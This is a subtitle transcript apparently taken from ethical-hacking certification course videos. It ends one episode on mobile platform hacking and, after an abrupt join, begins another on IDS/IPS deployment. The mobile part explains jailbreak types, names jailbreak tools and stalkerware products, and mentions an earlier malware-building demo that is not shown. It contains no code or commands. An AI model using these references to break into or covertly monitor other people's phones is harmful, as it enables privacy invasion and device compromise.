--> 00:41:58.920\nThat would work on the Android platform.\n\n880\n00:41:58.920 --> 00:42:01.367\nSo that may be kinda cool.\n\n881\n00:42:01.367 --> 00:42:05.220\nMakes a really good mobile security\nplatforms, a lot of big vendors do.\n\n882\n00:42:05.220 --> 00:42:07.910\nSo you obviously could look for\nthat kind of stuff.\n\n883\n00:42:07.910 --> 00:42:11.600\nThere's antivirus that you can get\nto run on these platforms as well.\n\n884\n00:42:11.600 --> 00:42:12.870\nWant to be thinking about that.\n\n885\n00:42:14.160 --> 00:42:16.870\nSo a lot of different stuff that\nyou could find across any and\n\n886\n00:42:16.870 --> 00:42:17.860\nall of these platforms.\n\n887\n00:42:17.860 --> 00:42:20.700\nSame conversation quickly with iOS.\n\n888\n00:42:20.700 --> 00:42:22.720\nWe'll just hit the highlights on each one.\n\n889\n00:42:22.720 --> 00:42:26.520\nYou can hack the Apple iOS as well,\nnot hard.\n\n890\n00:42:26.520 --> 00:42:28.940\nPotentially to do we talked\nabout jailbreaking there,\n\n891\n00:42:28.940 --> 00:42:32.120\nthe process of installing the modified\nkernels as we talked about.\n\n892\n00:42:32.120 --> 00:42:35.000\nProbably a good place to throw in\nthe different types of jailbreaking.\n\n893\n00:42:35.000 --> 00:42:36.860\nSo let's just talk about them.\n\n894\n00:42:36.860 --> 00:42:39.190\nYou know we can do\nuntethered jailbreaking.\n\n895\n00:42:39.190 --> 00:42:40.280\nUntethered jailbreaking,\n\n896\n00:42:40.280 --> 00:42:44.090\nthe idea that general concept behind it\nis that if you turn the device off and\n\n897\n00:42:44.090 --> 00:42:48.390\nback on it essentially starts up\ncompletely, the kernel is patched\n\n898\n00:42:48.390 --> 00:42:51.600\nwithout the help of a computer, it stays\njail broken in other words, right.\n\n899\n00:42:51.600 --> 00:42:53.180\nWe do an untethered jail break.\n\n900\n00:42:53.180 --> 00:42:56.280\nYou jail break the device and\nyou permanently have jail broken it,\n\n901\n00:42:56.280 --> 00:42:58.780\nit power cycles and stays jail broken.\n\n902\n00:42:58.780 --> 00:43:03.020\nIf you do semi-tethered jail\nbreaking you have to be tethered, so\n\n903\n00:43:03.020 --> 00:43:06.850\nthat when you turn the device back\non it starts up completely but\n\n904\n00:43:06.850 --> 00:43:10.430\nthe kernel's not patched, you have to\nessentially reload the patched kernel.\n\n905\n00:43:10.430 --> 00:43:15.100\nSo you can use it but\njailbroken add-ons have to be reloaded and\n\n906\n00:43:15.100 --> 00:43:20.350\nthen tethered jailbreaking is you have to,\nwhenever the device starts back up,\n\n907\n00:43:20.350 --> 00:43:22.720\nit's no longer a patch or\nthere's no longer jail broken.\n\n908\n00:43:22.720 --> 00:43:25.750\nThe problem is, it often gets stuck and\nit's partially booted, and\n\n909\n00:43:25.750 --> 00:43:27.830\nthat's when you brick\nthe device basically right?\n\n910\n00:43:27.830 --> 00:43:28.730\nSo that's the problem.\n\n911\n00:43:28.730 --> 00:43:32.928\nSo you would have to go in and you would\nhave to re-jailbreak it by tethering it\n\n912\n00:43:32.928 --> 00:43:36.040\nand essentially bricking it\nagain to try to get it reset.\n\n913\n00:43:36.040 --> 00:43:39.400\nSo a lot of times if you jailbreak\na device you don't do it the right way\n\n914\n00:43:39.400 --> 00:43:40.070\nand you brick it.\n\n915\n00:43:40.070 --> 00:43:42.780\nBricking it is just the slang term for\nessentially breaking it and\n\n916\n00:43:42.780 --> 00:43:44.280\nrendering it inoperable.\n\n917\n00:43:44.280 --> 00:43:47.000\nThe only way to get it to work again and\nreload it would be to re-tether and\n\n918\n00:43:47.000 --> 00:43:49.220\ntry to reload and jail break the OS again.\n\n919\n00:43:49.220 --> 00:43:52.000\nSo, just wanna make sure\nwe're familiar with this and\n\n920\n00:43:52.000 --> 00:43:55.690\njust have a general sense of the different\nkinds of jail breaking that can go on.\n\n921\n00:43:55.690 --> 00:43:58.570\nYou know, so untethered,\nsemi tethered, tethered,\n\n922\n00:43:58.570 --> 00:44:02.090\nI'll give you the definitions make sure\nyou have those, But, for instance,\n\n923\n00:44:02.090 --> 00:44:08.070\nwe can go in and find and\ntake a look at jail broken system.\n\n924\n00:44:08.070 --> 00:44:11.215\nCydia is a package tool that\nlets us do some of this,\n\n925\n00:44:11.215 --> 00:44:13.310\nC-Y-D-I-A on the iOS platform.\n\n926\n00:44:13.310 --> 00:44:15.380\nSo, it looks for app platform issues.\n\n927\n00:44:15.380 --> 00:44:18.893\nThere's Pangu as well,\nwhich is a jail breaking tool,\n\n928\n00:44:18.893 --> 00:44:21.145\nP A N G U tool that is often used.\n\n929\n00:44:21.145 --> 00:44:21.740\nPangu for\n\n930\n00:44:21.740 --> 00:44:26.050\nthe mac is what's often used to do on\ntether jail breaking on the mac platform.\n\n931\n00:44:26.050 --> 00:44:28.200\nThere's app synth and red snow.\n\n932\n00:44:28.200 --> 00:44:31.190\nThere's a lot of different ones that\nare a lot of different jail breaking tools\n\n933\n00:44:31.190 --> 00:44:33.450\nyou may or may not have heard of.\n\n934\n00:44:33.450 --> 00:44:34.360\nBut, a whole bunch.\n\n935\n00:44:34.360 --> 00:44:36.590\nBlack Reign, Lime Reign,\n\n936\n00:44:36.590 --> 00:44:39.070\nall sorts of different ones out\nthere that are kind of cool.\n\n937\n00:44:39.070 --> 00:44:43.470\nMaking sure that, again common sense for\nrunning security on these platforms\n\n938\n00:44:43.470 --> 00:44:46.370\nensure you're not downloading\ncode that you're not aware of.\n\n939\n00:44:46.370 --> 00:44:49.950\nDon't download from outside the app store,\ndon't download code that's not digitally\n\n940\n00:44:49.950 --> 00:44:52.820\nsigned that you're not able\nto trust the vendor on.\n\n941\n00:44:52.820 --> 00:44:56.300\nDon't install something that ask for\nsome bizarre permissions.\n\n942\n00:44:56.300 --> 00:44:59.252\nA lot of times I see people install\napps they don't stop and read the,\n\n943\n00:44:59.252 --> 00:45:00.915\nHey,I wanna have access to this or that.\n\n944\n00:45:00.915 --> 00:45:02.277\n&gt;&gt; [LAUGHTER]\n&gt;&gt; On your you Philip sur key.\n\n945\n00:45:02.277 --> 00:45:03.753\nI want the app so install it.\n\n946\n00:45:03.753 --> 00:45:06.390\nYou should actually look at\nwhat those app are asking for.\n\n947\n00:45:06.390 --> 00:45:07.290\nAnd if they're asking for\n\n948\n00:45:07.290 --> 00:45:10.370\neverything under the sun,\nthen that may not be a good idea, right.\n\n949\n00:45:10.370 --> 00:45:11.910\nSo it's just something to think about.\n\n950\n00:45:11.910 --> 00:45:12.950\nWe mentioned Windows Phone,\n\n951\n00:45:12.950 --> 00:45:15.910\nobviously the Windows Mobile Phone\nplatform, is out there.\n\n952\n00:45:15.910 --> 00:45:17.560\nIt's really never been that popular.\n\n953\n00:45:17.560 --> 00:45:21.080\nIt's diminishing in its value and\nin its applicability.\n\n954\n00:45:21.080 --> 00:45:22.200\nMost people are not deploying it.\n\n955\n00:45:22.200 --> 00:45:24.130\nSo you wanna know you can hack it there.\n\n956\n00:45:24.130 --> 00:45:26.030\nFirmware, boot loaders, right and\n\n957\n00:45:26.030 --> 00:45:30.680\nyour operating system, jailbreaking can\nbe done there but it's not very common.\n\n958\n00:45:30.680 --> 00:45:31.640\nSo just keep that in mind.\n\n959\n00:45:31.640 --> 00:45:34.592\nSame kind of guidelines you'd\napply to Windows machine there.\n\n960\n00:45:34.592 --> 00:45:36.080\nSame though process,\n\n961\n00:45:36.080 --> 00:45:40.805\ndownload from authorized vendors that\nyou'll assign code Node things like that.\n\n962\n00:45:40.805 --> 00:45:43.115\nYou know, just the general\nthought process to secure.\n\n963\n00:45:43.115 --> 00:45:44.805\nRegards to Blackberry.\n\n964\n00:45:44.805 --> 00:45:46.525\n&gt;&gt; My favorite,\nthere's absolutely nothing I could say.\n\n965\n00:45:46.525 --> 00:45:47.765\nIt's perfect.\nThere's absolutely nothing we\n\n966\n00:45:47.765 --> 00:45:48.346\nshould talk about here.\n\n967\n00:45:48.346 --> 00:45:49.485\n&gt;&gt; [LAUGH]\n&gt;&gt; Quite the opposite, actually.\n\n968\n00:45:49.485 --> 00:45:52.905\nBlackberry, although it is considered\nstill to be certainly if not the most\n\n969\n00:45:52.905 --> 00:45:55.390\nsecure One of the most secure mobile OSs.\n\n970\n00:45:55.390 --> 00:45:57.760\nBut there are problems like anything else-\n&gt;&gt; And it's fair and\n\n971\n00:45:57.760 --> 00:45:59.450\nhonest to admit that, certainly.\n\n972\n00:45:59.450 --> 00:46:03.650\nYou can, because of the fact that we\ndo a Java based third party application\n\n973\n00:46:03.650 --> 00:46:07.640\nframeworks that run, at least in some of\nthe earlier versions of the Blackberry OS,\n\n974\n00:46:07.640 --> 00:46:10.590\nthis is potentially a source of issue and\nconcern.\n\n975\n00:46:10.590 --> 00:46:12.170\nSo we do have to be aware of that.\n\n976\n00:46:12.170 --> 00:46:15.830\nYeah, we do have the Blackberry Enterprise\nservers and obviously the ability to deal\n\n977\n00:46:15.830 --> 00:46:18.950\nwith security from a policy\nmanagement perspective is greatly\n\n978\n00:46:18.950 --> 00:46:23.000\nenhanced compared to other platforms on\nBlackberry but malicious code can get in\n\n979\n00:46:23.000 --> 00:46:27.480\nthere we are using the android App Store\nnow so that those present some challenges.\n\n980\n00:46:27.480 --> 00:46:30.570\nThere are memory in process\nmanipulation attacks that can occur.\n\n981\n00:46:30.570 --> 00:46:34.570\nThere may be email exploits that we get,\nalthough the email client is very secure,\n\n982\n00:46:34.570 --> 00:46:38.120\nthe built in generic Blackberry browser,\nthe web browser's very secure.\n\n983\n00:46:38.120 --> 00:46:40.420\nYou can download additional\nbrowsers like the Alpha browser.\n\n984\n00:46:40.420 --> 00:46:41.000\nI use about three or\n\n985\n00:46:41.000 --> 00:46:44.500\nfour different browsers on my\nBlackberry that are highly secure.\n\n986\n00:46:44.500 --> 00:46:46.450\nAnd then you can go to the extreme and\nget the Blackphone,\n\n987\n00:46:46.450 --> 00:46:47.256\nwhich is,\n&gt;&gt; Yes.\n\n988\n00:46:47.256 --> 00:46:49.170\n[LAUGH]\n&gt;&gt; The James Bond\n\n989\n00:46:49.170 --> 00:46:50.890\n&gt;&gt; You know security device but\n\n990\n00:46:50.890 --> 00:46:55.360\nyou could get SMS exploited attacks,\nagain people could be texting you.\n\n991\n00:46:55.360 --> 00:46:57.860\nThere may be connection\nvulnerabilities on wireless.\n\n992\n00:46:57.860 --> 00:47:00.200\nThere is malware although\nvery small amounts.\n\n993\n00:47:00.200 --> 00:47:02.720\nThere is some malware actually\non the blackberry platform.\n\n994\n00:47:02.720 --> 00:47:05.040\nSo, it is important to\njust think about that.\n\n995\n00:47:05.040 --> 00:47:08.640\nIt's very rare that we do see attacks\nthat are propagated actively.\n\n996\n00:47:08.640 --> 00:47:11.030\nYou just don't hear about blackberry's\nbeing attacked that often.\n\n997\n00:47:11.030 --> 00:47:13.800\nIf they are attacked it's\ntypically because somebody broke\n\n998\n00:47:13.800 --> 00:47:17.060\nIn because you physically got the device,\nthat kind of thing.\n\n999\n00:47:17.060 --> 00:47:19.810\nYou didn't encrypt your SD storage and\nsomebody stole it.\n\n1000\n00:47:19.810 --> 00:47:23.260\nI mean these are the device exploits\nI hear about more than anything else.\n\n1001\n00:47:23.260 --> 00:47:27.410\nBut JAD file exploits, so Java\nApplication Descriptor file exploits for\n\n1002\n00:47:27.410 --> 00:47:29.590\nthe Java code are somewhat common,\n\n1003\n00:47:29.590 --> 00:47:32.470\nthat's typically where we tend\nto see out of this taking place.\n\n1004\n00:47:32.470 --> 00:47:34.680\nSo, it's just something to consider,\nbut it is,\n\n1005\n00:47:34.680 --> 00:47:37.690\nagain, something I would\nleast be aware of.\n\n1006\n00:47:37.690 --> 00:47:41.633\nOf all of the platforms I'd say that I\nprobably have less to worry about on this\n\n1007\n00:47:41.633 --> 00:47:45.408\none than most, but I still have stuff\nto worry about, so it is important.\n\n1008\n00:47:45.408 --> 00:47:48.894\nA lot of the mobile device management\nplatforms do actually reach out, and\n\n1009\n00:47:48.894 --> 00:47:51.109\nuse these technologies\nto secure platforms and\n\n1010\n00:47:51.109 --> 00:47:54.284\nto secure Blackberries through\nremote wipe, so it is good to know.\n\n1011\n00:47:54.284 --> 00:47:55.442\nBut there is mobile spyware.\n\n1012\n00:47:55.442 --> 00:47:58.750\nThings like mSpy and StealthGenie\ncould potentially be running and\n\n1013\n00:47:58.750 --> 00:48:00.470\nyou have to be aware of that.\n\n1014\n00:48:00.470 --> 00:48:02.540\nAnd so these are some of\nthe concerns that we may have.\n\n1015\n00:48:02.540 --> 00:48:04.201\nSpyBubble, another one.\n\n1016\n00:48:04.201 --> 00:48:05.730\n&gt;&gt; [LAUGH]\n&gt;&gt; FlexiSPY, MobiSpy or\n\n1017\n00:48:05.730 --> 00:48:06.729\nMobiStealth rather.\n\n1018\n00:48:06.729 --> 00:48:09.729\nSo there's all these different\nones out there that we may see.\n\n1019\n00:48:10.780 --> 00:48:11.850\nSo I was thinking about that.\n\n1020\n00:48:11.850 --> 00:48:14.400\nWe were talking about the mobile\ndevice management platforms.\n\n1021\n00:48:14.400 --> 00:48:17.470\nWhy they're so important,\nthere's a million of them out there.\n\n1022\n00:48:17.470 --> 00:48:18.419\nI mean there are so many.\n\n1023\n00:48:18.419 --> 00:48:21.000\nAirWatch is one of the most popular\nones that everybody knows about.\n\n1024\n00:48:21.000 --> 00:48:22.677\nRight?\nBut there's XenMobile.\n\n1025\n00:48:22.677 --> 00:48:25.225\nXen has a real good platform from Citrix.\n\n1026\n00:48:25.225 --> 00:48:26.410\nThat's one of their specialties.\n\n1027\n00:48:26.410 --> 00:48:28.700\nThere's Mobile Iron,\nthere's a whole bunch of different ones.\n\n1028\n00:48:28.700 --> 00:48:32.750\nWhatever you use I can't say\nenough about MDM and why it is so\n\n1029\n00:48:32.750 --> 00:48:35.757\nimportant in an episode like this, right?\n\n1030\n00:48:35.757 --> 00:48:40.050\nThe whole BYOD phenomenon has\nreally kind of come and gone.\n\n1031\n00:48:40.050 --> 00:48:42.610\nI think now corporate entities\nhave given up and just said, hey,\n\n1032\n00:48:42.610 --> 00:48:44.330\nwe're not in the phone business anymore.\n\n1033\n00:48:44.330 --> 00:48:45.454\nBring your own phone in.\n\n1034\n00:48:45.454 --> 00:48:47.748\nWe're gonna apply management\nat the perimeter and\n\n1035\n00:48:47.748 --> 00:48:50.380\nunderstand how to deal with\nthat from an MDM perspective.\n\n1036\n00:48:50.380 --> 00:48:54.370\nBut we're not gonna really deal\nwith trying to take on having\n\n1037\n00:48:54.370 --> 00:48:57.730\nyou being given corporate advice and\ntrying to do that whole thing.\n\n1038\n00:48:57.730 --> 00:48:59.555\nIt just really was so ineffective, right?\n\n1039\n00:48:59.555 --> 00:49:00.870\n&gt;&gt; Mm-hm.\n&gt;&gt; I mean they were in the hardware\n\n1040\n00:49:00.870 --> 00:49:03.670\nbusiness and the software business and\nit was just very difficult to manage.\n\n1041\n00:49:03.670 --> 00:49:06.285\nAnd it was really just counterproductive.\n\n1042\n00:49:06.285 --> 00:49:09.975\nSo most of my customers have gotten\nout of that whole thought process.\n\n1043\n00:49:09.975 --> 00:49:12.425\nAnd I think for the betterment\nof the organization [LAUGH] and\n\n1044\n00:49:12.425 --> 00:49:14.155\nthe sanity of the individuals as well.\n\n1045\n00:49:14.155 --> 00:49:16.155\nSo jst thinking about that kind of stuff.\n\n1046\n00:49:16.155 --> 00:49:19.365\nBut probably as we talk about this and\nthinking about\n\n1047\n00:49:19.365 --> 00:49:23.315\njust mobile device management overall and\nhacking on mobile platforms.\n\n1048\n00:49:23.315 --> 00:49:27.540\nIt's the basic thought process around\nsecurity 101 stuff that we do.\n\n1049\n00:49:27.540 --> 00:49:31.550\nEncouraging users to use strong passwords,\napplying encryption locally on the device.\n\n1050\n00:49:31.550 --> 00:49:33.730\nMaking sure they don't leave\nthe device unsecured and\n\n1051\n00:49:33.730 --> 00:49:35.500\nunprotected if they walk away.\n\n1052\n00:49:35.500 --> 00:49:38.840\nUsing some sort of a password or\na PIN or whatever it may be.\n\n1053\n00:49:38.840 --> 00:49:41.950\nMaking sure that they only\napply vendor approved patches.\n\n1054\n00:49:41.950 --> 00:49:45.980\nThey only apply digitally signed and\nvalidated applications.\n\n1055\n00:49:45.980 --> 00:49:48.020\nIf we can get users just to do that stuff,\n\n1056\n00:49:48.020 --> 00:49:50.130\nI mean most of the problems\nwe have in this area go away.\n\n1057\n00:49:50.130 --> 00:49:51.090\nBelieve it or not, it's true.\n\n1058\n00:49:51.090 --> 00:49:51.660\nIt's hard.\n\n1059\n00:49:51.660 --> 00:49:52.500\nI'm not saying that's easy.\n\n1060\n00:49:52.500 --> 00:49:55.340\nBut i'm just pointing out that\nwould really be the solution.\n\n1061\n00:49:55.340 --> 00:49:57.237\nThat or we go back to coconut.\n\n1062\n00:49:57.237 --> 00:50:00.210\nWhich are the coconut\nstrings that we talked about.\n\n1063\n00:50:00.210 --> 00:50:01.540\n&gt;&gt; [LAUGH] Yeah,\nthe range is just not there.\n\n1064\n00:50:01.540 --> 00:50:04.799\n&gt;&gt; No, no, no, you have to have\nadvanced coconuts, like Coconut 2.0.\n\n1065\n00:50:04.799 --> 00:50:06.414\n&gt;&gt; [LAUGH]\n&gt;&gt; It's coco-walk as opposed to\n\n1066\n00:50:06.414 --> 00:50:07.180\ncoconut, right?\n\n1067\n00:50:07.180 --> 00:50:10.750\nBut that's about it, that probably\ndoes it for our conversation.\n\n1068\n00:50:10.750 --> 00:50:11.400\n&gt;&gt; All right Adam.\n\n1069\n00:50:11.400 --> 00:50:12.500\nAnother great episode there.\n\n1070\n00:50:12.500 --> 00:50:14.410\nA lot of information about\nthe mobile platform,\n\n1071\n00:50:14.410 --> 00:50:16.710\nlooking at the world of\nhacking mobile devices.\n\n1072\n00:50:16.710 --> 00:50:19.710\nWe started off looking at\nthe OS mobile top ten.\n\n1073\n00:50:19.710 --> 00:50:23.570\nWe also did a great demonstration there\non actually building up a malware package\n\n1074\n00:50:23.570 --> 00:50:26.120\nthat could be delivered\nout to mobile devices.\n\n1075\n00:50:26.120 --> 00:50:27.830\nSo we appreciate that.\n\n1076\n00:50:27.830 --> 00:50:29.600\nHope everybody out there enjoyed watching.\n\n1077\n00:50:29.600 --> 00:50:32.150\nSigning off for ITProTV, I'm Mike Rodrick.\n\n1078\n00:50:32.150 --> 00:50:34.790\n&gt;&gt; I'm an APK file, look out, here I come.\n\n1079\n00:50:34.790 --> 00:50:36.844\n&gt;&gt; [LAUGH] We'll see you next time.\n\n1080\n00:50:36.844 --> 00:50:42.481\n[SOUND]\n\n",

00:00:17.087\nI'm your host Mike Rodrick and\n\n4\n00:00:17.087 --> 00:00:19.232\ntoday we're doing our\nCertified Ethical Hacker version 9.\n\n5\n00:00:19.232 --> 00:00:24.750\nAnd specifically in this episode, we're\ngoing to be looking at intrusion detection\n\n6\n00:00:24.750 --> 00:00:30.140\nand intrusion prevention systems,\nfirewalls, hand puppets, and honey pots.\n\n7\n00:00:30.140 --> 00:00:34.134\nAnd here to help us with all of the above\nis Mr Adam Gordon, how are you doing Adam?\n\n8\n00:00:34.134 --> 00:00:36.330\nSpoke just little too soon.\n\n9\n00:00:36.330 --> 00:00:36.965\n&gt;&gt; Almost.\n\n10\n00:00:36.965 --> 00:00:38.850\n&gt;&gt; [LAUGH]\n&gt;&gt; I'm doing good.\n\n11\n00:00:38.850 --> 00:00:43.210\nSo, we're gonna talk a little bit about\nas Mike was just saying, IDSs, IPSs,\n\n12\n00:00:43.210 --> 00:00:48.095\nHoneypots, Firewalls,\nHoneynets, black coffee in bed.\n\n13\n00:00:48.095 --> 00:00:52.005\nGreat band, Squeeze,\nfrom the 1980s, by the way, 1990s.\n\n14\n00:00:52.005 --> 00:00:57.505\nAnd we are going to start that discussion\nby actually taking a quick look\n\n15\n00:00:57.505 --> 00:01:01.810\nat a drawing that Mike has\nbeen laboring over here.\n\n16\n00:01:01.810 --> 00:01:05.313\nAnd I noticed the color scheme is as\nbland as ever, thank you very much.\n\n17\n00:01:05.313 --> 00:01:07.500\n&gt;&gt; [LAUGH] You can tell I did this,\nnot Ronnie, yeah.\n\n18\n00:01:07.500 --> 00:01:10.503\n&gt;&gt; Yes, I see our conversation stuck and\nyou took the guidance we offered and\n\n19\n00:01:10.503 --> 00:01:12.406\nthrew it out the window,\nthank you very much.\n\n20\n00:01:12.406 --> 00:01:16.822\nAnd I notice that even worse is\nthe fact that the border around\n\n21\n00:01:16.822 --> 00:01:20.640\nthe drawing on the desktop\nis actually colorful.\n\n22\n00:01:20.640 --> 00:01:21.280\n&gt;&gt; Yes.\n[LAUGH]\n\n23\n00:01:21.280 --> 00:01:22.563\n&gt;&gt; So we do have color, but\n\n24\n00:01:22.563 --> 00:01:25.719\nit's not making it's way into\nyour world is the problem.\n\n25\n00:01:25.719 --> 00:01:26.945\n&gt;&gt; It's not, it's not.\n\n26\n00:01:26.945 --> 00:01:30.320\n&gt;&gt; Okay so now that we've harped\non that enough let us continue.\n\n27\n00:01:30.320 --> 00:01:34.980\nSo what we thought we would do\nquickly is just remind ourselves\n\n28\n00:01:34.980 --> 00:01:39.480\nof what an IDS and/or IPS thought process\nlooks like from two perspectives.\n\n29\n00:01:39.480 --> 00:01:42.495\nOne we'll talk through the narrative\naround what it is, how it works,\n\n30\n00:01:42.495 --> 00:01:44.768\nwhy it does what it does,\nbut also how we deploy them.\n\n31\n00:01:44.768 --> 00:01:47.760\nVery important to understand that\nwe have some options here, right?\n\n32\n00:01:47.760 --> 00:01:51.150\nWe have a network-based option and\nwe have a host based option.\n\n33\n00:01:51.150 --> 00:01:53.590\nSo we just wanted to quickly\nthrow together a diagram.\n\n34\n00:01:53.590 --> 00:01:56.911\nWe've got a little DMZ going on\nthere in between the two firewalls,\n\n35\n00:01:56.911 --> 00:01:58.082\ngot a web server there.\n\n36\n00:01:58.082 --> 00:01:59.847\nAnd then we're gonna\ntotally ignore that for\n\n37\n00:01:59.847 --> 00:02:03.270\nthe rest of the conversation cuz it has\nabsolutely no bearing on what we're doing.\n\n38\n00:02:03.270 --> 00:02:07.140\nSo it's there but it's like a distraction,\nit's actually not supposed to be there.\n\n39\n00:02:07.140 --> 00:02:11.246\nAnd then on the inside on\nthe LAN we have an IDS/IPS\n\n40\n00:02:11.246 --> 00:02:15.500\ndevice in line as we would say\nwhich is a network deployment.\n\n41\n00:02:15.500 --> 00:02:17.940\nSo we call that a NID,\na network-based ideas or\n\n42\n00:02:17.940 --> 00:02:21.140\na NIP, a network-based IPS deployment.\n\n43\n00:02:21.140 --> 00:02:25.800\nAnd the network-based discussion is\nreally about putting a device in\n\n44\n00:02:25.800 --> 00:02:28.670\nthat will a lot of times\nbe attached to a switch.\n\n45\n00:02:28.670 --> 00:02:31.420\nIt may not actually be sitting in line,\nalthough it can be.\n\n46\n00:02:31.420 --> 00:02:35.570\nWe talked, in the sniffing episodes, a\nlittle bit about the idea of being able to\n\n47\n00:02:35.570 --> 00:02:40.240\nuse a SPAN port, right, and being able to,\nessentially, monitor through the switch.\n\n48\n00:02:40.240 --> 00:02:43.500\nAnd the value of doing that would be\nthat we get all the traffic through\n\n49\n00:02:43.500 --> 00:02:45.170\nthat switch on that subnet.\n\n50\n00:02:45.170 --> 00:02:48.490\nWe could simply plug this in\ndirectly to the network as well.\n\n51\n00:02:48.490 --> 00:02:50.930\nThere's different ways when they deploy,\nso it would depend on the architecture.\n\n52\n00:02:50.930 --> 00:02:53.840\nBut traditionally,\nwe will run that through a switch, and\n\n53\n00:02:53.840 --> 00:02:58.990\nthen on an individual machine,\nsome sort of a server there, a SQL Server.\n\n54\n00:02:58.990 --> 00:03:04.870\nWe have an IDS/IPS box representing\nan agent that would be running inside\n\n55\n00:03:04.870 --> 00:03:09.030\nof the systems, this would be the host\nbase, the HID or the HIP based deployment.\n\n56\n00:03:09.030 --> 00:03:13.380\nSo host based IDS, host based IPS where\nwe have a piece of software essentially\n\n57\n00:03:13.380 --> 00:03:17.690\nrunning on the system and then allowing\nus to monitor traffic coming in and\n\n58\n00:03:17.690 --> 00:03:21.320\ngoing out of this box, but\nlimited to this particular box.\n\n59\n00:03:21.320 --> 00:03:23.435\nAs opposed to the broader conversation and\n\n60\n00:03:23.435 --> 00:03:26.520\nbroader information gathering of\nnetwork based appliance of device.\n\n61\n00:03:26.520 --> 00:03:28.750\nSo I just wanna have a sense of that.\n\n62\n00:03:28.750 --> 00:03:31.930\nWe're also wanna talk a bit\nabout what IDS is and IPS do.\n\n63\n00:03:31.930 --> 00:03:33.979\nThere are some subtle, but\nvery important differences between them.\n\n64\n00:03:33.979 --> 00:03:39.515\nThe main difference between these two\ndevices is that it is a question of focus.\n\n65\n00:03:39.515 --> 00:03:42.860\nI think it's probably a good way of\nthinking about it in a question of\n\n66\n00:03:42.860 --> 00:03:43.710\npurpose.\n\n67\n00:03:43.710 --> 00:03:47.580\nSo IDSs are passive devices,\nthey will monitor and alert us.\n\n68\n00:03:47.580 --> 00:03:50.984\nAnd I often make this point\nwhen I talk about this, and\n\n69\n00:03:50.984 --> 00:03:54.691\nI know I've made this point in\nsome of our other episodes,\n\n70\n00:03:54.691 --> 00:03:59.686\nthat IDS's even though we consider them\npassive, do have the ability to alert\n\n71\n00:03:59.686 --> 00:04:03.186\nus to the fact that we are able\nto see traffic coming in.\n\n72\n00:04:03.186 --> 00:04:07.870\nMaybe let's from the DMZ coming across\nthrough the web server, hypothetically.\n\n73\n00:04:07.870 --> 00:04:11.740\nWe would see traffic coming across and\nwe're able to then be\n\n74\n00:04:11.740 --> 00:04:16.310\nmonitoring in real time but also alert\nourselves that there may be a problem.\n\n75\n00:04:16.310 --> 00:04:19.170\nMaybe there is some sort of packet or\n\n76\n00:04:19.170 --> 00:04:22.150\nsome sort of group of\npackets that look unusual.\n\n77\n00:04:22.150 --> 00:04:25.330\nSo we can be alerted and\nthat is not an activity or\n\n78\n00:04:25.330 --> 00:04:28.370\nan action that is considered\nto be necessary for\n\n79\n00:04:28.370 --> 00:04:31.770\nthe ideas to undertake other than\nsimply to pass along information.\n\n80\n00:04:31.770 --> 00:04:34.900\nSo we still consider this to\nbe passive with an IPS of\n\n81\n00:04:34.900 --> 00:04:37.540\nintrusion prevention systems,\nthese are active systems.\n\n82\n00:04:37.540 --> 00:04:39.620\nThey do everything IDSs do, but\n\n83\n00:04:39.620 --> 00:04:43.857\nthey in addition can take on\nthe added burden, added liability,\n\n84\n00:04:43.857 --> 00:04:49.327\nand/or added responsibility of being able\nto take action to change or modify system\n\n85\n00:04:49.327 --> 00:04:54.899\nbehavior as a result of inbound traffic\nend notification, a potential compromise.\n\n86\n00:04:54.899 --> 00:04:59.007\nSo they may trigger an entry in\nthe firewall to change a block or route,\n\n87\n00:04:59.007 --> 00:05:03.055\nthey may add or remove an application\nfrom a white or a black list.\n\n88\n00:05:03.055 --> 00:05:06.297\nThey may do a variety of things\nthat require additional effort and\n\n89\n00:05:06.297 --> 00:05:07.737\ncapability to achieve.\n\n90\n00:05:07.737 --> 00:05:10.777\nAnd so\nIPS's are going to be able to take on\n\n91\n00:05:10.777 --> 00:05:13.247\nthe ability to be able to\nchange our network on the fly.\n\n92\n00:05:13.247 --> 00:05:16.537\nWhich is also very important for\nus to think about and to consider.\n\n93\n00:05:16.537 --> 00:05:18.097\nSo just a little way to get started here.\n\n94\n00:05:18.097 --> 00:05:21.357\nA little graphic that allows\nus to show this to you.\n\n95\n00:05:21.357 --> 00:05:24.817\nI notice as we're looking at the graphic\nthat you've stopped signing your work.\n\n96\n00:05:24.817 --> 00:05:26.829\n&gt;&gt; No.\n&gt;&gt; Which is not the way you want to\n\n97\n00:05:26.829 --> 00:05:27.623\nget famous.\n\n98\n00:05:27.623 --> 00:05:28.837\n&gt;&gt; No, it's not.\n&gt;&gt; Because nobody knows who it is.\n\n99\n00:05:28.837 --> 00:05:31.718\nBecause I'm going to tell everybody\nthat Meagan did that, if you don't sign,\n\n100\n00:05:31.718 --> 00:05:33.274\nit just that they think that, there we go.\n\n101\n00:05:33.274 --> 00:05:34.454\nYeah, you can't see it, but okay.\n\n102\n00:05:34.454 --> 00:05:36.733\n&gt;&gt; [LAUGH]\n&gt;&gt; You know how to put the squiggly under\n\n103\n00:05:36.733 --> 00:05:39.255\nthere so it looks like a half smiley,\nbut that's your blue,\n\n104\n00:05:39.255 --> 00:05:42.432\nI guess it's not your blue period it's\nyour black period, so that's why.\n\n105\n00:05:42.432 --> 00:05:46.966\nLater historians and art critics\nwill notice there was a change in\n\n106\n00:05:46.966 --> 00:05:50.690\nMIke's demeanor during\nthis period in time.\n\n107\n00:05:50.690 --> 00:05:53.660\nAll right so we have that diagram and\nso thank you very much for\n\n108\n00:05:53.660 --> 00:05:54.850\ntaking care of that for us.\n\n109\n00:05:54.850 --> 00:05:55.890\nWe do appreciate that.\n\n110\n00:05:55.890 --> 00:05:58.165\nSo when we think about IDSs and\n\n111\n00:05:58.165 --> 00:06:02.080\nIPSs one of the very first things you\nwant to consider is placement, right?\n\n112\n00:06:02.080 --> 00:06:03.280\nI mean placement is key.\n\n113\n00:06:03.280 --> 00:06:07.180\nWe have to understand where the device is\nin relation to the traffic that we want to\n\n114\n00:06:07.180 --> 00:06:07.930\nmonitor.\n\n115\n00:06:07.930 --> 00:06:11.630\nBecause if we want to monitor broadly\nacross a subnet or portions of\n\n116\n00:06:11.630 --> 00:06:14.980\nthe network, doing a host-based deployment\nis not going to get the job done.\n\n117\n00:06:14.980 --> 00:06:17.960\nBut if we want to monitor\na very specifically narrowly\n\n118\n00:06:17.960 --> 00:06:21.730\ntargeted information, we need to\nbe doing a host based employment.\n\n119\n00:06:21.730 --> 00:06:25.665\nWe could get that with a network-based IDS\nbut we'll have to allow more filtering.\n\n120\n00:06:25.665 --> 00:06:28.330\nIt will be a lot more difficult\nto figure out how to 